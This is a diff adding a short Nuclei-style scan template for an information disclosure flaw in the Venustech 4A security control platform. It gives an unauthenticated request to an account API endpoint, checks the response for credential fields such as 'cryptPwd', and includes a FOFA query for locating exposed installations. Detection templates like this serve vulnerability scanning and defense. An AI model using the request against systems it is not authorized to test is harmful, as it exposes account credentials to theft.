@@ -1,0 +1,33 @@
+id: venustech-4a-getMaster-disclosure
+
+info:
+  name: Venustech 4A 统一安全管控平台 - Disclosure
+  author: leadlife
+  severity: high
+  description:
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: body="cas/css/ace-part2.min.css"
+  tags: venustech,disclosure
+
+http:
+  - raw:
+      - |
+        GET /accountApi/getMaster.do?id=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'authtype'
+          - 'cryptPwd'
+          - 'email'
+        condition: and
+        
+      - type: status
+        status:
+          - 200
